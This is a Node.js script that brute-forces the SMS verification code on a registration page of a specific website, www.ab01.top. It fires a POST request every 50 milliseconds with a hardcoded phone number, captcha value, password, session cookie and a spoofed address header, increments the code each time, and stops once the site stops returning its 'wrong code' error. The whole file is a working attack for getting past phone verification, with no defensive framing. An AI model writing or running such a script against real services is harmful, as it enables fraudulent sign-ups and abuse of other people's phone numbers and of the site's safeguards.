const request = require('request')
const generateNum = (bite = 10) => {
  return `1${Math.random() * 10000}`.replace('.', '').slice(0, bite + 1)
}
const generateVe = () => {
  let a = 4497
  return () => {
    return a++
  }
}
const generateV = generateVe()

const po = () => {
  const code = generateV()
  request({
    uri: `http://www.ab01.top/register/ajaxregister.html`,
    method: 'post',
    formData: {
      Mobile: '13897675643',
      ImgCode: '0283',
      MsgCode: code,
      Password: 'qwerret345',
      puser: 'gzqd01',
    },
    headers: {
      localAddress: '202.1.1.1',
      "content-type": "application/json;charset=UTF-8",
      "cookie": 'PHPSESSID=12bh2f9dtb9oi75tt5rl2pv635; OUTFOX_SEARCH_USER_ID_NCOO=1532220847.2533906; _d_id=60ee332ae1bfc0d741099746343f6e; yzm=think%3A%7B%22yzm%22%3A%220283%22%7D',
      
    }
  }, function(error, response, body) {
    let data = {};
    try {data = JSON.parse(body)}catch(e){console.log('parse wrong', body)}
    if (body) {
      console.log('code', code, 'body: ', data)
      if (!/手机验证码错误/.test(data.message)) {
        console.log('___success', 'code', code, 'body: ', data)
        clearInterval(inter)
      }
    }
  })
}

const inter = setInterval(() => {po()}, 50)